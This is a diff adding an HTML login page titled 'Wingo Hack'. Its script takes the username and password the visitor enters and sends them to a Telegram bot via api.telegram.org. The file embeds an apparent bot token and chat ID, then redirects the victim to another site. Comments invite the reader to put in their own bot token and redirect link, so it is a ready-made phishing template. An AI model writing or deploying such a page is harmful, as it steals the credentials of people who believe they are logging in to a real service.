@@ -1,0 +1,98 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Login - Wingo Hack</title>
+    <style>
+        body {
+            background-color: black;
+            color: white;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+        }
+
+        .login-container {
+            background-color: rgba(255, 255, 255, 0.1);
+            padding: 20px;
+            border-radius: 8px;
+            width: 300px;
+            text-align: center;
+        }
+
+        input {
+            width: 100%;
+            padding: 10px;
+            margin: 10px 0;
+            border: none;
+            border-radius: 4px;
+            background-color: rgba(255, 255, 255, 0.2);
+            color: white;
+        }
+
+        button {
+            width: 100%;
+            padding: 10px;
+            background-color: white;
+            color: black;
+            border: none;
+            border-radius: 4px;
+            cursor: pointer;
+        }
+
+        button:hover {
+            background-color: lightgray;
+        }
+
+        .error {
+            color: red;
+            margin-top: 10px;
+        }
+    </style>
+</head>
+<body>
+    <div class="login-container">
+        <h2>Login to Wingo Hack</h2>
+        <input type="text" id="loginUsername" placeholder="Username" required>
+        <input type="password" id="loginPassword" placeholder="Password" required>
+        <button id="loginSubmit">Submit</button>
+        <div class="error" id="loginErrorMessage"></div>
+    </div>
+
+    <script>
+        document.getElementById('loginSubmit').addEventListener('click', function() {
+            const username = document.getElementById('loginUsername').value;
+            const password = document.getElementById('loginPassword').value;
+            const loginErrorMessage = document.getElementById('loginErrorMessage');
+            loginErrorMessage.innerHTML = '';
+
+            // Check if username and password are provided
+            if (username && password) {
+                const message = `Login Attempt:\nUsername: ${username}\nPassword: ${password}`;
+                const botToken = '7844503532:AAF6I1nGnJn9BMub0R3l7w90GUXKYLYWRkE'; // Replace with your Telegram bot token
+                const chatId = '7467384643'; // Replace with your Telegram chat ID
+                const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
+
+                fetch(url)
+                    .then(response => {
+                        if (response.ok) {
+                            // Redirect to specified website
+                            window.location.href = 'https://sdtricker.github.io/Shree/'; // Replace with your desired website link
+                        } else {
+                            loginErrorMessage.innerHTML = 'Failed to send credentials.';
+                        }
+                    })
+                    .catch(error => {
+                        console.error('Error:', error);
+                        loginErrorMessage.innerHTML = 'Error occurred while sending credentials.';
+                    });
+            } else {
+                loginErrorMessage.innerHTML = 'Please enter both username and password.';
+            }
+        });
+    </script>
+</body>
+</html>
